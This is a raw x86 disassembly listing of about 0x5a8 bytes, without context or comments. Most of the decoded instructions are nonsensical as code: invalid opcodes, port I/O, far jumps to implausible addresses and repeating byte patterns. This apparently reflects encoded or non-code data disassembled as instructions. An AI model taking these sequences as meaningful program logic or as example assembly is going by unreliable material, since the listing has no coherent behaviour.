  403ce8:	e2 de                	loop   0x403cc8
  403cea:	a3 5f e0 58 63       	mov    %eax,0x6358e05f
  403cef:	eb 60                	jmp    0x403d51
  403cf1:	e5 60                	in     $0x60,%eax
  403cf3:	d4 a2                	aam    $0xa2
  403cf5:	23 a0 18 0d 88 e0    	and    -0x1f77f2e8(%eax),%esp
  403cfb:	60                   	pusha
  403cfc:	63 eb                	arpl   %ebp,%ebx
  403cfe:	b0 e5                	mov    $0xe5,%al
  403d00:	72 d4                	jb     0x403cd6
  403d02:	d7                   	xlat   %ds:(%ebx)
  403d03:	eb ea                	jmp    0x403cef
  403d05:	58                   	pop    %eax
  403d06:	e9 d4 d1 b3 29       	jmp    0x29f40edf
  403d0b:	23 2b                	and    (%ebx),%ebp
  403d0d:	a2 9c 48 c5 5d       	mov    %al,0x5dc5489c
  403d12:	9f                   	lahf
  403d13:	5f                   	pop    %edi
  403d14:	29 22                	sub    %esp,(%edx)
  403d16:	2b 63 29             	sub    0x29(%ebx),%esp
  403d19:	73 f0                	jae    0x403d0b
  403d1b:	eb e8                	jmp    0x403d05
  403d1d:	5c                   	pop    %esp
  403d1e:	88 d2                	mov    %dl,%dl
  403d20:	8a 5f 9f             	mov    -0x61(%edi),%bl
  403d23:	b8 2b a8 98 a9       	mov    $0xa998a82b,%eax
  403d28:	1c 6d                	sbb    $0x6d,%al
  403d2a:	9f                   	lahf
  403d2b:	a8 98                	test   $0x98,%al
  403d2d:	d5 a8                	aad    $0xa8
  403d2f:	ed                   	in     (%dx),%eax
  403d30:	e0 58                	loopne 0x403d8a
  403d32:	88 8a 89 5f 9f eb    	mov    %cl,-0x1460a077(%edx)
  403d38:	b3 bb                	mov    $0xbb,%bl
  403d3a:	29 30                	sub    %esi,(%eax)
  403d3c:	63 49 5b             	arpl   %ecx,0x5b(%ecx)
  403d3f:	5f                   	pop    %edi
  403d40:	9f                   	lahf
  403d41:	5f                   	pop    %edi
  403d42:	63 eb                	arpl   %ebp,%ebx
  403d44:	60                   	pusha
  403d45:	49                   	dec    %ecx
  403d46:	53                   	push   %ebx
  403d47:	5f                   	pop    %edi
  403d48:	9f                   	lahf
  403d49:	5f                   	pop    %edi
  403d4a:	63 eb                	arpl   %ebp,%ebx
  403d4c:	60                   	pusha
  403d4d:	b3 25                	mov    $0x25,%bl
  403d4f:	20 14 8d 2b b8 9c e5 	and    %dl,-0x1a6347d5(,%ecx,4)
  403d56:	7b d4                	jnp    0x403d2c
  403d58:	c6                   	(bad)
  403d59:	aa                   	stos   %al,%es:(%edi)
  403d5a:	1c 7b                	sbb    $0x7b,%al
  403d5c:	d9 3a                	fnstcw (%edx)
  403d5e:	1d 7f c9 33 25       	sbb    $0x2533c97f,%eax
  403d63:	29 1c 79             	sub    %ebx,(%ecx,%edi,2)
  403d66:	d9 39                	fnstcw (%ecx)
  403d68:	1f                   	pop    %ds
  403d69:	71 a1                	jno    0x403d0c
  403d6b:	22 2b                	and    (%ebx),%ch
  403d6d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403d6e:	c4 68 88             	les    -0x78(%eax),%ebp
  403d71:	50                   	push   %eax
  403d72:	9c                   	pushf
  403d73:	5f                   	pop    %edi
  403d74:	9f                   	lahf
  403d75:	4b                   	dec    %ebx
  403d76:	b1 91                	mov    $0x91,%cl
  403d78:	72 4b                	jb     0x403dc5
  403d7a:	85 e9                	test   %ebp,%ecx
  403d7c:	79 4b                	jns    0x403dc9
  403d7e:	8b eb                	mov    %ebx,%ebp
  403d80:	e4 84                	in     $0x84,%al
  403d82:	a8 48                	test   $0x48,%al
  403d84:	91                   	xchg   %eax,%ecx
  403d85:	5b                   	pop    %ebx
  403d86:	9f                   	lahf
  403d87:	5f                   	pop    %edi
  403d88:	fb                   	sti
  403d89:	22 a4 60 63 b3 f6 b7 	and    -0x48094c9d(%eax,%eiz,2),%ah
  403d90:	29 23                	sub    %esp,(%ebx)
  403d92:	29 36                	sub    %esi,(%esi)
  403d94:	29 2f                	sub    %ebp,(%edi)
  403d96:	88 02                	mov    %al,(%edx)
  403d98:	9f                   	lahf
  403d99:	5f                   	pop    %edi
  403d9a:	9f                   	lahf
  403d9b:	eb b3                	jmp    0x403d50
  403d9d:	e5 72                	in     $0x72,%eax
  403d9f:	d4 d0                	aam    $0xd0
  403da1:	eb ea                	jmp    0x403d8d
  403da3:	5c                   	pop    %esp
  403da4:	ee                   	out    %al,(%dx)
  403da5:	dc ca                	fmul   %st,%st(2)
  403da7:	99                   	cltd
  403da8:	6e                   	outsb  %ds:(%esi),(%dx)
  403da9:	dd c6                	ffree  %st(6)
  403dab:	e5 9f                	in     $0x9f,%eax
  403dad:	de c2                	faddp  %st,%st(2)
  403daf:	89 91 99 6f de a2    	mov    %edx,-0x5d219067(%ecx)
  403db5:	e9 6f 89 99 61       	jmp    0x61d9c729
  403dba:	92                   	xchg   %eax,%edx
  403dbb:	ed                   	in     (%dx),%eax
  403dbc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403dbd:	77 88                	ja     0x403d47
  403dbf:	32 89 5f 9f eb b3    	xor    -0x4c1460a1(%ecx),%cl
  403dc5:	e9 78 eb f2 5c       	jmp    0x5d332942
  403dca:	c9                   	leave
  403dcb:	5a                   	pop    %edx
  403dcc:	88 ac a0 60 a0 bf fe 	mov    %ch,-0x1405fa0(%eax,%eiz,4)
  403dd3:	bb 63 e5 60 d4       	mov    $0xd460e563,%ebx
  403dd8:	e0 e5                	loopne 0x403dbf
  403dda:	72 d4                	jb     0x403db0
  403ddc:	d1 b3 f6 b7 29 26    	shll   $1,0x2629b7f6(%ebx)
  403de2:	29 37                	sub    %esi,(%edi)
  403de4:	2b af 9c b7 2b b6    	sub    -0x49d44864(%edi),%ebp
  403dea:	9c                   	pushf
  403deb:	aa                   	stos   %al,%es:(%edi)
  403dec:	18 7b 2a             	sbb    %bh,0x2a(%ebx)
  403def:	66 e6 89             	data16 out %al,$0x89
  403df2:	71 de                	jno    0x403dd2
  403df4:	b4 52                	mov    $0x52,%ah
  403df6:	4e                   	dec    %esi
  403df7:	d5 b0                	aad    $0xb0
  403df9:	e9 6b b6 f7 e9       	jmp    0xea37f469
  403dfe:	71 53                	jno    0x403e53
  403e00:	46                   	inc    %esi
  403e01:	bf fe d4 ac e9       	mov    $0xe9acd4fe,%edi
  403e06:	79 4b                	jns    0x403e53
  403e08:	8c ba d1 20 8b 68    	mov    %?,0x688b20d1(%edx)
  403e0e:	d1 20                	shll   $1,(%eax)
  403e10:	63 ba 29 58 c9 30    	arpl   %edi,0x30c95829(%edx)
  403e16:	ff                   	(bad)
  403e17:	be fb 23 2d a0       	mov    $0xa02d23fb,%esi
  403e1c:	a0 b3 f6 b7 29       	mov    0x29b7f6b3,%al
  403e21:	23 29                	and    (%ecx),%ebp
  403e23:	36 d1 5f 25          	rcrl   $1,%ss:0x25(%edi)
  403e27:	32 1e                	xor    (%esi),%bl
  403e29:	a8 2b                	test   $0x2b,%al
  403e2b:	63 25 20 14 83 23    	arpl   %esp,0x23831420
  403e31:	d8 98 61 15 7d 23    	fcomps 0x237d1561(%eax)
  403e37:	48                   	dec    %eax
  403e38:	a8 e3                	test   $0xe3,%al
  403e3a:	62 69 f0             	bound  %ebp,-0x10(%ecx)
  403e3d:	e9 80 48 d5 48       	jmp    0x491586c2
  403e42:	9f                   	lahf
  403e43:	5f                   	pop    %edi
  403e44:	f8                   	clc
  403e45:	e3 60                	jecxz  0x403ea7
  403e47:	68 29 63 29 d0       	push   $0xd0296329
  403e4c:	9c                   	pushf
  403e4d:	26 a4                	movsb  %es:(%esi),%es:(%edi)
  403e4f:	66 a0 4b c8 e9 70    	data16 mov 0x70e9c84b,%al
  403e55:	48                   	dec    %eax
  403e56:	7f 5b                	jg     0x403eb3
  403e58:	9f                   	lahf
  403e59:	5f                   	pop    %edi
  403e5a:	29 27                	sub    %esp,(%edi)
  403e5c:	2b 63 25             	sub    0x25(%ebx),%esp
  403e5f:	20 14 70             	and    %dl,(%eax,%esi,2)
  403e62:	29 5a 2b             	sub    %ebx,0x2b(%edx)
  403e65:	a8 9c                	test   $0x9c,%al
  403e67:	99                   	cltd
  403e68:	91                   	xchg   %eax,%ecx
  403e69:	dc a2 e9 91 48 c3    	fsubl  -0x3cb76e17(%edx)
  403e6f:	49                   	dec    %ecx
  403e70:	9f                   	lahf
  403e71:	5f                   	pop    %edi
  403e72:	29 38                	sub    %edi,(%eax)
  403e74:	88 60 9b             	mov    %ah,-0x65(%eax)
  403e77:	5f                   	pop    %edi
  403e78:	9f                   	lahf
  403e79:	e9 db bf fe bb       	jmp    0xbc3efe59
  403e7e:	63 eb                	arpl   %ebp,%ebx
  403e80:	60                   	pusha
  403e81:	10 a1 49 39 48 9f    	adc    %ah,-0x60b7c6b7(%ecx)
  403e87:	5f                   	pop    %edi
  403e88:	63 eb                	arpl   %ebp,%ebx
  403e8a:	b0 e5                	mov    $0xe5,%al
  403e8c:	72 d4                	jb     0x403e62
  403e8e:	ae                   	scas   %es:(%edi),%al
  403e8f:	27                   	daa
  403e90:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  403e95:	b0 f2                	mov    $0xf2,%al
  403e97:	48                   	dec    %eax
  403e98:	ed                   	in     (%dx),%eax
  403e99:	47                   	inc    %edi
  403e9a:	9f                   	lahf
  403e9b:	5f                   	pop    %edi
  403e9c:	f8                   	clc
  403e9d:	23 2d a0 a0 e5 72    	and    0x72e5a0a0,%ebp
  403ea3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea4:	24 40                	and    $0x40,%al
  403ea6:	9f                   	lahf
  403ea7:	5f                   	pop    %edi
  403ea8:	9f                   	lahf
  403ea9:	eb ea                	jmp    0x403e95
  403eab:	5c                   	pop    %esp
  403eac:	71 49                	jno    0x403ef7
  403eae:	af                   	scas   %es:(%edi),%eax
  403eaf:	e4 75                	in     $0x75,%al
  403eb1:	5f                   	pop    %edi
  403eb2:	9f                   	lahf
  403eb3:	5f                   	pop    %edi
  403eb4:	f1                   	int1
  403eb5:	b2 f0                	mov    $0xf0,%dl
  403eb7:	48                   	dec    %eax
  403eb8:	c5 47 9f             	lds    -0x61(%edi),%eax
  403ebb:	5f                   	pop    %edi
  403ebc:	25 20 af e4 5d       	and    $0x5de4af20,%eax
  403ec1:	5f                   	pop    %edi
  403ec2:	9f                   	lahf
  403ec3:	5f                   	pop    %edi
  403ec4:	63 91 69 b3 2a aa    	arpl   %edx,-0x55d54c97(%ecx)
  403eca:	a1 b6 f7 e9 63       	mov    0x63e9f7b6,%eax
  403ecf:	ed                   	in     (%dx),%eax
  403ed0:	14 71                	adc    $0x71,%al
  403ed2:	aa                   	stos   %al,%es:(%edi)
  403ed3:	eb 1c                	jmp    0x403ef1
  403ed5:	71 a6                	jno    0x403e7d
  403ed7:	eb b6                	jmp    0x403e8f
  403ed9:	eb e6                	jmp    0x403ec1
  403edb:	64 a1 38 2b 72 59    	mov    %fs:0x59722b38,%eax
  403ee1:	61                   	popa
  403ee2:	a0 60 a0 48 ab       	mov    0xab48a060,%al
  403ee7:	60                   	pusha
  403ee8:	a0 60 23 26 a8       	mov    0xa8262360,%al
  403eed:	af                   	scas   %es:(%edi),%eax
  403eee:	1f                   	pop    %ds
  403eef:	47                   	inc    %edi
  403ef0:	ff                   	(bad)
  403ef1:	be fb 23 30 e5       	mov    $0xe53023fb,%esi
  403ef6:	69 6f 24 ea a0 60 a0 	imul   $0xa060a0ea,0x24(%edi),%ebp
  403efd:	b3 f6                	mov    $0xf6,%bl
  403eff:	b7 29                	mov    $0x29,%bh
  403f01:	23 29                	and    (%ecx),%ebp
  403f03:	36 29 2f             	sub    %ebp,%ss:(%edi)
  403f06:	d1 32                	shll   $1,(%edx)
  403f08:	2a 66 2a             	sub    0x2a(%esi),%ah
  403f0b:	b6 a1                	mov    $0xa1,%dh
  403f0d:	91                   	xchg   %eax,%ecx
  403f0e:	69 9c aa d4 c2 9c ab 	imul   $0xac9cbed4,-0x54633d2c(%edx,%ebp,4),%ebx
  403f15:	d4 be 9c ac 
  403f19:	d4 c4                	aam    $0xc4
  403f1b:	9c                   	pushf
  403f1c:	ad                   	lods   %ds:(%esi),%eax
  403f1d:	d4 d3                	aam    $0xd3
  403f1f:	9c                   	pushf
  403f20:	ae                   	scas   %es:(%edi),%al
  403f21:	d4 ed                	aam    $0xed
  403f23:	9c                   	pushf
  403f24:	af                   	scas   %es:(%edi),%eax
  403f25:	d4 ae                	aam    $0xae
  403f27:	9c                   	pushf
  403f28:	b1 d4                	mov    $0xd4,%cl
  403f2a:	aa                   	stos   %al,%es:(%edi)
  403f2b:	10 a2 bf fe bb 89    	adc    %ah,-0x76440141(%edx)
  403f31:	4c                   	dec    %esp
  403f32:	87 5f 9f             	xchg   %ebx,-0x61(%edi)
  403f35:	e9 ab e3 63 64       	jmp    0x64a422e5
  403f3a:	ef                   	out    %eax,(%dx)
  403f3b:	df 98 4b e5 e9 ab    	fistps -0x54161ab5(%eax)
  403f41:	e9 eb 64 29 ab       	jmp    0xab69a431
  403f46:	a8 e9                	test   $0xe9,%al
  403f48:	eb 6c                	jmp    0x403fb6
  403f4a:	23 23                	and    (%ebx),%esp
  403f4c:	b0 af                	mov    $0xaf,%al
  403f4e:	1f                   	pop    %ds
  403f4f:	4f                   	dec    %edi
  403f50:	8b 92 f5 e9 75 eb    	mov    -0x148a160b(%edx),%edx
  403f56:	f4                   	hlt
  403f57:	8e aa e9 78 63 fc    	mov    -0x39c8717(%edx),%gs
  403f5d:	8e a2 eb ec 8e a6    	mov    -0x59711315(%edx),%fs
  403f63:	eb b2                	jmp    0x403f17
  403f65:	48                   	dec    %eax
  403f66:	2b 5f 9f             	sub    -0x61(%edi),%ebx
  403f69:	5f                   	pop    %edi
  403f6a:	ef                   	out    %eax,(%dx)
  403f6b:	df 88 bd 8b 74 f5    	fisttps -0xa8b7443(%eax)
  403f71:	e9 75 e9 78 63       	jmp    0x63b928eb
  403f76:	fc                   	cld
  403f77:	8e a2 e9 92 48 e5    	mov    -0x1ab76d17(%edx),%fs
  403f7d:	5f                   	pop    %edi
  403f7e:	9f                   	lahf
  403f7f:	5f                   	pop    %edi
  403f80:	ef                   	out    %eax,(%dx)
  403f81:	df 90 bd ff be fb    	fists  -0x4410043(%eax)
  403f87:	23 30                	and    (%eax),%esi
  403f89:	91                   	xchg   %eax,%ecx
  403f8a:	69 b3 2a aa a1 b6 f7 	imul   $0xed63e9f7,-0x495e55d6(%ebx),%esi
  403f91:	e9 63 ed 
  403f94:	14 71                	adc    $0x71,%al
  403f96:	aa                   	stos   %al,%es:(%edi)
  403f97:	eb 1c                	jmp    0x403fb5
  403f99:	71 a6                	jno    0x403f41
  403f9b:	eb b6                	jmp    0x403f53
  403f9d:	eb e6                	jmp    0x403f85
  403f9f:	64 a1 38 2b 72 59    	mov    %fs:0x59722b38,%eax
  403fa5:	61                   	popa
  403fa6:	a0 60 a0 48 af       	mov    0xaf48a060,%al
  403fab:	60                   	pusha
  403fac:	a0 60 23 26 a8       	mov    0xa8262360,%al
  403fb1:	af                   	scas   %es:(%edi),%eax
  403fb2:	1f                   	pop    %ds
  403fb3:	47                   	inc    %edi
  403fb4:	29 38                	sub    %edi,(%eax)
  403fb6:	ff                   	(bad)
  403fb7:	be fb 23 2d a0       	mov    $0xa02d23fb,%esi
  403fbc:	a0 e3 99 60 af       	mov    0xaf6099e3,%al
  403fc1:	e4 82                	in     $0x82,%al
  403fc3:	60                   	pusha
  403fc4:	a0 60 f0 b3 f6       	mov    0xf6b3f060,%al
  403fc9:	b7 29                	mov    $0x29,%bh
  403fcb:	23 29                	and    (%ecx),%ebp
  403fcd:	36 29 2f             	sub    %ebp,%ss:(%edi)
  403fd0:	d1 32                	shll   $1,(%edx)
  403fd2:	2a 66 2a             	sub    0x2a(%esi),%ah
  403fd5:	b6 a1                	mov    $0xa1,%dh
  403fd7:	9c                   	pushf
  403fd8:	aa                   	stos   %al,%es:(%edi)
  403fd9:	d4 c5                	aam    $0xc5
  403fdb:	9c                   	pushf
  403fdc:	ab                   	stos   %eax,%es:(%edi)
  403fdd:	d4 de                	aam    $0xde
  403fdf:	9c                   	pushf
  403fe0:	ac                   	lods   %ds:(%esi),%al
  403fe1:	d4 f3                	aam    $0xf3
  403fe3:	9c                   	pushf
  403fe4:	ad                   	lods   %ds:(%esi),%eax
  403fe5:	d4 fe                	aam    $0xfe
  403fe7:	9c                   	pushf
  403fe8:	ae                   	scas   %es:(%edi),%al
  403fe9:	d4 18                	aam    $0x18
  403feb:	9c                   	pushf
  403fec:	af                   	scas   %es:(%edi),%eax
  403fed:	6f                   	outsl  %ds:(%esi),(%dx)
  403fee:	24 e6                	and    $0xe6,%al
  403ff0:	a0 60 a0 9c b1       	mov    0xb19ca060,%al
  403ff5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff6:	24 ed                	and    $0xed,%al
  403ff8:	a0 60 a0 49 39       	mov    0x3949a060,%al
  403ffd:	60                   	pusha
  403ffe:	a0 60 23 59 a1       	mov    0xa1592360,%al
  404003:	e9 78 df aa 48       	jmp    0x48eb1f80
  404008:	0d 59 9f 5f 89       	or     $0x895f9f59,%eax
  40400d:	f3 a0 60 a0 e9 6a    	repz mov 0x6ae9a060,%al
  404013:	48                   	dec    %eax
  404014:	25 59 9f 5f 89       	and    $0x895f9f59,%eax
  404019:	e7 a0                	out    %eax,$0xa0
  40401b:	60                   	pusha
  40401c:	a0 e3 99 61 29       	mov    0x296199e3,%al
  404021:	38 1f                	cmp    %bl,(%edi)
  404023:	68 9f 75 cc 00       	push   $0xcc759f
  404028:	e0 60                	loopne 0x40408a
  40402a:	8b d8                	mov    %eax,%ebx
  40402c:	29 2a                	sub    %ebp,(%edx)
  40402e:	9f                   	lahf
  40402f:	75 d0                	jne    0x404001
  404031:	00 e0                	add    %ah,%al
  404033:	60                   	pusha
  404034:	8b ce                	mov    %esi,%ecx
  404036:	29 38                	sub    %edi,(%eax)
  404038:	23 23                	and    (%ebx),%esp
  40403a:	b0 48                	mov    $0x48,%al
  40403c:	6d                   	insl   (%dx),%es:(%edi)
  40403d:	62 a0 60 ef df 93    	bound  %esp,-0x6c2010a0(%eax)
  404043:	4b                   	dec    %ebx
  404044:	ff b5 29 35 2b b4    	push   -0x4bd4cad7(%ebp)
  40404a:	ce                   	into
  40404b:	6a 29                	push   $0x29
  40404d:	38 a3 bc ce 62 2b    	cmp    %ah,0x2b62cebc(%ebx)
  404053:	ac                   	lods   %ds:(%esi),%al
  404054:	ce                   	into
  404055:	66 2b 72 88          	sub    -0x78(%edx),%si
  404059:	c0 9f 5f 9f af 1f 48 	rcrb   $0x48,0x1faf9f5f(%edi)
  404060:	fd                   	std
  404061:	4b                   	dec    %ebx
  404062:	e1 b5                	loope  0x404019
  404064:	29 35 29 38 a3 bc    	sub    %esi,0xbca33829
  40406a:	ce                   	into
  40406b:	62 29                	bound  %ebp,(%ecx)
  40406d:	52                   	push   %edx
  40406e:	88 76 9f             	mov    %dh,-0x61(%esi)
  404071:	5f                   	pop    %edi
  404072:	9f                   	lahf
  404073:	af                   	scas   %es:(%edi),%eax
  404074:	1f                   	pop    %ds
  404075:	50                   	push   %eax
  404076:	fd                   	std
  404077:	4b                   	dec    %ebx
  404078:	cb                   	lret
  404079:	e9 78 e3 63 64       	jmp    0x64a423f6
  40407e:	88 56 a4             	mov    %dl,-0x5c(%esi)
  404081:	60                   	pusha
  404082:	a0 af 1f 53 8b       	mov    0x8b531faf,%al
  404087:	7c 29                	jl     0x4040b2
  404089:	38 29                	cmp    %ch,(%ecx)
  40408b:	52                   	push   %edx
  40408c:	23 23                	and    (%ebx),%esp
  40408e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40408f:	48                   	dec    %eax
  404090:	f1                   	int1
  404091:	64 a0 60 ef df 91    	mov    %fs:0x91dfef60,%al
  404097:	4b                   	dec    %ebx
  404098:	ab                   	stos   %eax,%es:(%edi)
  404099:	bf fe bb f8 10       	mov    $0x10f8bbfe,%edi
  40409e:	a2 49 1d 46 9f       	mov    %al,0x9f461d49
  4040a3:	5f                   	pop    %edi
  4040a4:	ff                   	(bad)
  4040a5:	be fb b8 63 23       	mov    $0x2363b8fb,%esi
  4040aa:	2d a0 a0 b3 f6       	sub    $0xf6b3a0a0,%eax
  4040af:	b7 f5                	mov    $0xf5,%bh
  4040b1:	e9 63 e9 76 91       	jmp    0x91b72a19
  4040b6:	60                   	pusha
  4040b7:	ea e1 61 2d dc a8 6a 	ljmp   $0x6aa8,$0xdc2d61e1
  4040be:	2b cf                	sub    %edi,%ecx
  4040c0:	9c                   	pushf
  4040c1:	91                   	xchg   %eax,%ecx
  4040c2:	60                   	pusha
  4040c3:	eb ef                	jmp    0x4040b4
  4040c5:	58                   	pop    %eax
  4040c6:	f1                   	int1
  4040c7:	eb ef                	jmp    0x4040b8
  4040c9:	64 c9                	fs leave
  4040cb:	21 1e                	and    %ebx,(%esi)
  4040cd:	6b 29 22             	imul   $0x22,(%ecx),%ebp
  4040d0:	a1 50 a1 3a 88       	mov    0x883aa150,%eax
  4040d5:	1c 86                	sbb    $0x86,%al
  4040d7:	5f                   	pop    %edi
  4040d8:	9f                   	lahf
  4040d9:	eb e7                	jmp    0x4040c2
  4040db:	64 2b 77 2b          	sub    %fs:0x2b(%edi),%esi
  4040df:	72 2a                	jb     0x40410b
  4040e1:	6a 20                	push   $0x20
  4040e3:	59                   	pop    %ecx
  4040e4:	aa                   	stos   %al,%es:(%edi)
  4040e5:	d4 d1                	aam    $0xd1
  4040e7:	e0 99                	loopne 0x404082
  4040e9:	6b 14 9d 20 59 ac d4 	imul   $0xffffffe9,-0x2b53a6e0(,%ebx,4),%edx
  4040f0:	e9 
  4040f1:	e0 99                	loopne 0x40408c
  4040f3:	6d                   	insl   (%dx),%es:(%edi)
  4040f4:	14 b5                	adc    $0xb5,%al
  4040f6:	20 59 ae             	and    %bl,-0x52(%ecx)
  4040f9:	d4 10                	aam    $0x10
  4040fb:	e0 99                	loopne 0x404096
  4040fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040fe:	af                   	scas   %es:(%edi),%eax
  4040ff:	e4 20                	in     $0x20,%al
  404101:	60                   	pusha
  404102:	a0 60 20 59 b1       	mov    0xb1592060,%al
  404107:	6f                   	outsl  %ds:(%esi),(%dx)
  404108:	24 e8                	and    $0xe8,%al
  40410a:	a0 60 a0 10 a2       	mov    0xa210a060,%al
  40410f:	bd ff be fb 49       	mov    $0x49fbbeff,%ebp
  404114:	a9 46 9f 5f 2b       	test   $0x2b5f9f46,%eax
  404119:	74 d0                	je     0x4040eb
  40411b:	61                   	popa
  40411c:	78 48                	js     0x404166
  40411e:	4b                   	dec    %ebx
  40411f:	58                   	pop    %eax
  404120:	9f                   	lahf
  404121:	5f                   	pop    %edi
  404122:	58                   	pop    %eax
  404123:	64 a0 60 a0 4b 1d    	mov    %fs:0x1d4ba060,%al
  404129:	eb b4                	jmp    0x4040df
  40412b:	90                   	nop
  40412c:	a1 38 88 ce 9d       	mov    0x9dce8838,%eax
  404131:	5f                   	pop    %edi
  404132:	9f                   	lahf
  404133:	18 a4 60 a0 60 8b cc 	sbb    %ah,-0x33749f60(%eax,%eiz,2)
  40413a:	2d 74 d0 61 78       	sub    $0x7861d074,%eax
  40413f:	48                   	dec    %eax
  404140:	61                   	popa
  404141:	61                   	popa
  404142:	a0 60 58 70 a0       	mov    0xa0705860,%al
  404147:	60                   	pusha
  404148:	a0 4b fb 91 69       	mov    0x6991fb4b,%al
  40414d:	ea ea 61 9f d4 b1 62 	ljmp   $0x62b1,$0xd49f61ea
  404154:	9f                   	lahf
  404155:	d4 b1                	aam    $0xb1
  404157:	66 2b ac b1 6a 2b 69 	sub    0x2d692b6a(%ecx,%esi,4),%bp
  40415e:	2d 
  40415f:	74 d0                	je     0x404131
  404161:	61                   	popa
  404162:	78 48                	js     0x4041ac
  404164:	01 60 a0             	add    %esp,-0x60(%eax)
  404167:	60                   	pusha
  404168:	f8                   	clc
  404169:	4b                   	dec    %ebx
  40416a:	db 91 69 ea ea 61    	fistl  0x61eaea69(%ecx)
  404170:	2b ac b1 62 f1 e9 71 	sub    0x71e9f162(%ecx,%esi,4),%ebp
  404177:	ed                   	in     (%dx),%eax
  404178:	b4 90                	mov    $0x90,%ah
  40417a:	a1 38 88 8c 9f       	mov    0x9f8c8838,%eax
  40417f:	5f                   	pop    %edi
  404180:	9f                   	lahf
  404181:	b8 8b 82 2b 74       	mov    $0x742b828b,%eax
  404186:	d0 61 78             	shlb   $1,0x78(%ecx)
  404189:	48                   	dec    %eax
  40418a:	a3 64 a0 60 58       	mov    %eax,0x5860a064
  40418f:	64 a0 60 a0 4b b1    	mov    %fs:0xb14ba060,%al
  404195:	e9 71 eb b4 90       	jmp    0x90f52d0b
  40419a:	a1 38 88 e0 a3       	mov    0xa3e08838,%eax
  40419f:	60                   	pusha
  4041a0:	a0 18 a4 60 a0       	mov    0xa060a418,%al
  4041a5:	60                   	pusha
  4041a6:	a3 a7 a4 e3 67       	mov    %eax,0x67e3a4a7
  4041ab:	68 ed 6f 25 74       	push   $0x74256fed
  4041b0:	9f                   	lahf
  4041b1:	5f                   	pop    %edi
  4041b2:	9f                   	lahf
  4041b3:	b9 c9 21 1e 6a       	mov    $0x6a1e21c9,%ecx
  4041b8:	2d 74 b8 61 90       	sub    $0x9061b874,%eax
  4041bd:	48                   	dec    %eax
  4041be:	73 45                	jae    0x404205
  4041c0:	9f                   	lahf
  4041c1:	5f                   	pop    %edi
  4041c2:	fd                   	std
  4041c3:	bf fe bb 63 eb       	mov    $0xeb63bbfe,%edi
  4041c8:	60                   	pusha
  4041c9:	b3 f6                	mov    $0xf6,%bl
  4041cb:	b7 f5                	mov    $0xf5,%bh
  4041cd:	e9 63 e9 76 e9       	jmp    0xe9b72b35
  4041d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d3:	eb 0c                	jmp    0x4041e1
  4041d5:	84 b4 ea af e0 99 6a 	test   %dh,0x6a99e0af(%edx,%ebp,8)
  4041dc:	14 91                	adc    $0x91,%al
  4041de:	20 59 ab             	and    %bl,-0x55(%ecx)
  4041e1:	d4 e3                	aam    $0xe3
  4041e3:	e0 99                	loopne 0x40417e
  4041e5:	6c                   	insb   (%dx),%es:(%edi)
  4041e6:	14 b2                	adc    $0xb2,%al
  4041e8:	20 59 ad             	and    %bl,-0x53(%ecx)
  4041eb:	d4 01                	aam    $0x1
  4041ed:	e0 99                	loopne 0x404188
  4041ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4041f0:	14 dd                	adc    $0xdd,%al
  4041f2:	20 59 af             	and    %bl,-0x51(%ecx)
  4041f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4041f6:	24 f1                	and    $0xf1,%al
  4041f8:	a0 60 a0 e0 99       	mov    0x99e0a060,%al
  4041fd:	71 af                	jno    0x4041ae
  4041ff:	e4 3c                	in     $0x3c,%al
  404201:	60                   	pusha
  404202:	a0 60 50 62 fd       	mov    0xfd625060,%al
  404207:	bf fe bb 89 72       	mov    $0x7289bbfe,%edi
  40420c:	85 5f 9f             	test   %ebx,-0x61(%edi)
  40420f:	e9 78 eb b6 48       	jmp    0x48f72d8c
  404214:	55                   	push   %ebp
  404215:	57                   	push   %edi
  404216:	9f                   	lahf
  404217:	5f                   	pop    %edi
  404218:	23 23                	and    (%ebx),%esp
  40421a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40421b:	e3 66                	jecxz  0x404283
  40421d:	64 ed                	fs in  (%dx),%eax
  40421f:	d5 8e                	aad    $0x8e
  404221:	49                   	dec    %ecx
  404222:	2e 60                	cs pusha
  404224:	a0 60 29 38 2b       	mov    0x2b382960,%al
  404229:	76 88                	jbe    0x4041b3
  40422b:	d2 9c 5f 9f e3 63 64 	rcrb   %cl,0x6463e39f(%edi,%ebx,2)
  404232:	23 26                	and    (%esi),%esp
  404234:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404235:	ad                   	lods   %ds:(%esi),%eax
  404236:	15 4e 8b da 29       	adc    $0x29da8b4e,%eax
  40423b:	38 29                	cmp    %ch,(%ecx)
  40423d:	52                   	push   %edx
  40423e:	88 22                	mov    %ah,(%edx)
  404240:	a0 60 a0 e3 63       	mov    0x63e3a060,%al
  404245:	70 23                	jo     0x40426a
  404247:	26 b0 ad             	es mov $0xad,%al
  40424a:	15 4e 8b c6 d1       	adc    $0xd1c68b4e,%eax
  40424f:	29 2a                	sub    %ebp,(%edx)
  404251:	af                   	scas   %es:(%edi),%eax
  404252:	a1 ed 1c 99 a2       	mov    0xa2991ced,%eax
  404257:	e9 78 e9 92 eb       	jmp    0xebd32bd4
  40425c:	ef                   	out    %eax,(%dx)
  40425d:	68 9f d7 a4 48       	push   $0x48a4d79f
  404262:	03 5f 9f             	add    -0x61(%edi),%ebx
  404265:	5f                   	pop    %edi
  404266:	a3 7f a3 97 ed       	mov    %eax,0xed97a37f
  40426b:	d5 8a                	aad    $0x8a
  40426d:	4b                   	dec    %ebx
  40426e:	e5 e9                	in     $0xe9,%eax
  404270:	78 e9                	js     0x40425b
  404272:	92                   	xchg   %eax,%edx
  404273:	e9 99 48 d3 5e       	jmp    0x5f138b11
  404278:	9f                   	lahf
  404279:	5f                   	pop    %edi
  40427a:	d1 20                	shll   $1,(%eax)
  40427c:	2a a7 a1 63 fc 98    	sub    -0x67039c5f(%edi),%ah
  404282:	a2 63 14 98 a2       	mov    %al,0xa2981463
  404287:	ad                   	lods   %ds:(%esi),%eax
  404288:	15 45 8b 88 29       	adc    $0x29888b45,%eax
  40428d:	38 2b                	cmp    %ch,(%ebx)
  40428f:	76 88                	jbe    0x404219
